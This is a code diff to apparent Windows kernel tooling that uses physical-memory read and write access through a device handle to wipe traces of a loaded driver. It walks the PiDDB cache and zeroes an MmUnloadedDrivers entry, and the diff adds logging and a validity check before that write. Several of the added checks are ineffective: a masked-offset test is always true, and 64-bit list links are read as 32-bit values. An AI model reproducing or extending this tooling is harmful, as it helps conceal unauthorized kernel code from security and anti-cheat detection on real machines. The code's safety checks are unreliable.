@@ -7,6 +7,9 @@
 #include "cleanup.h"
 
 static ULONG64 ReadKernelPtr(HANDLE device, SyscallTable* sc, ULONG64 cr3, ULONG64 va) {
+    // The window is up by the time these run, and it is the only path that can
+    // explain a 0 (see WindowReadKernelPtr), so route through it.
+    if (PhysWindowModeEnabled()) return WindowReadKernelPtr(cr3, va, "kernel ptr");
     ULONG64 pa = VirtToPhys(device, sc, cr3, va);
     if (!pa) return 0;
     return PhysRead64(device, sc, pa);
@@ -25,11 +28,14 @@ bool CleanPiDDBCache(
 ) {
     printf("[*] Cleaning PiDDB...\n");
 
+    if (!offsets->PiDDBCacheList)
+        printf("[-] PiDDBCacheList RVA is 0, the walk cannot work\n");
+
     ULONG64 listHeadVA = offsets->NtoskrnlBase + offsets->PiDDBCacheList;
     ULONG64 currentVA = ReadKernelPtr(device, sc, systemCr3, listHeadVA);
 
     if (!currentVA || currentVA == listHeadVA) {
-        printf("[*] PiDDB empty\n");
+        printf("[*] PiDDB empty (list head 0x%llX, flink 0x%llX)\n", listHeadVA, currentVA);
         return true;
     }
 
@@ -77,7 +83,7 @@ bool CleanPiDDBCache(
         currentVA = ReadKernelPtr(device, sc, systemCr3, currentVA);
     }
 
-    printf("[*] PiDDB entry not found\n");
+    printf("[*] PiDDB entry not found (%d entries walked)\n", checked);
     return true;
 }
 
@@ -100,12 +106,52 @@ bool PrepareMmCleanup(
 
     ULONG entryIndex = ctx->preUnloadIndex % 50;
     ULONG64 entryVA = driversArrayVA + (ULONG64)entryIndex * 0x28;
+    printf("[*] MmUnloadedDrivers: array 0x%llX, index %u -> entry 0x%llX\n",
+           driversArrayVA, entryIndex, entryVA);
     ULONG64 entryPA = VirtToPhys(device, sc, systemCr3, entryVA);
     if (!entryPA) return false;
 
     ULONG64 entryPageBase = entryPA & ~0xFFFULL;
     ctx->offsetInPage = (ULONG)(entryPA & 0xFFF);
     ctx->driversArrayPA = entryPA;
+
+    // The entry is about to be zeroed in FinishMmCleanup(). If MmUnloadedDrivers
+    // resolved to the wrong global that means writing 0x28 bytes of zeros over
+    // an arbitrary kernel address, so verify the entry looks like an
+    // UNLOADED_DRIVERS_ENTRY first and refuse otherwise.
+    //   +0x10 BaseDllName (kernel VA)  +0x20 SizeOfImage
+    const ULONG64 kernelVaFloor = 0xFFFFF80000000000ULL;
+    ULONG64 nameVA = PhysRead64(device, sc, entryPA + 0x10);
+    ULONG64 entryPoint = PhysRead64(device, sc, entryPA + 0x18);
+    ULONG sizeOfImage = PhysRead32(device, sc, entryPA + 0x20);
+    ULONG flink = PhysRead32(device, sc, entryPA + 0x00);
+    ULONG blink = PhysRead32(device, sc, entryPA + 0x04);
+
+    bool plausible =
+        nameVA >= kernelVaFloor && (nameVA & 0xFFF) < 0x1000 &&
+        entryPoint >= kernelVaFloor && (entryPoint & 0xFFF) < 0x1000 &&
+        sizeOfImage > 0 && sizeOfImage < 0x10000000 &&
+        (flink == 0 || (flink & 0xFFF) < 0x1000) &&
+        (blink == 0 || (blink & 0xFFF) < 0x1000);
+
+    if (!plausible) {
+        // A slot that is entirely zero is simply unused: MmUnloadedDrivers is a
+        // fixed 50-entry ring and the entry the unload just took is the one
+        // about to be reused, so there is nothing to erase. Anything else that
+        // does not look like an UNLOADED_DRIVERS_ENTRY means the RVA is wrong,
+        // and writing would corrupt an unrelated kernel object.
+        bool empty = nameVA == 0 && entryPoint == 0 && sizeOfImage == 0 &&
+                     flink == 0 && blink == 0;
+        if (empty) {
+            printf("[*] MmUnloadedDrivers slot %u is already empty, nothing to clean\n", entryIndex);
+        } else {
+            printf("[-] MmUnloadedDrivers slot %u does not look valid "
+                   "(name 0x%llX entry 0x%llX size 0x%X links %X/%X) - not writing\n",
+                   entryIndex, nameVA, entryPoint, sizeOfImage, flink, blink);
+            printf("[-] Check the MmUnloadedDrivers RVA (0x%llX)\n", offsets->MmUnloadedDrivers);
+        }
+        return false;
+    }
 
     // pre-map pages — mappings survive driver unload
     ctx->mappedDriversPage = PhysMap(device, sc, entryPageBase, 0x1000);
